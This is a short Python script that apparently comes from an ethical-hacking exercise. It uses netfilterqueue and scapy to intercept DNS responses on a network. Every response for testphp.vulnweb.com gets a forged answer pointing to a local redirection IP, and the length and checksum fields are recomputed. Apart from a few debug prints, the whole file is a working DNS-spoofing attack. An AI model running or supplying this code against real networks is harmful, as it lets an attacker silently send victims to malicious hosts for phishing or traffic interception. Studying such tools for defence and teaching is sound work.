import netfilterqueue
import scapy.all as scapy

spoofing_target_url = "testphp.vulnweb.com"
spoofed_fake_taget_ip = "192.168.223.133" # Redirection IP

def process_packet(packet):
    print("TEST 1")
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet contains a DNS response layer:
    if scapy_packet.haslayer(scapy.DNSRR):
        print("TEST 2")
        # Retrieve the qname field of the perfromed DNS query (the IP of the URL that I am querying to the DNS server):
        qname = scapy_packet[scapy.DNSQR].qname

        if spoofing_target_url in qname:
            print("TEST 3")
            print("[+] Spoofing target")

            # Forging a DNS response:
            # rrname is the same of the qname
            # rdata:
            answer = scapy.DNSRR(rrname=qname, rdata=spoofed_fake_taget_ip)

            # Modify the answer section of the DNS response layer of the packet:
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1     # Because I am creating a single DNS answer

            # Delete len and checsum fields from the IP and UDP layers, scapy will recalculate
            # them based on the used valuses:
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set the payload of the original packet with the content of the packet forged by scapy:
            packet.set_payload(str(scapy_packet))

        #print(scapy_packet.show())

    packet.accept()
    #packet.drop()



# Create a queue and bind it to the IPTABLES queue identified with ID=0.
# The process_packet() callback function is associated with this binding. This function will be exectuted for each
# packet dropped in my queue.
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


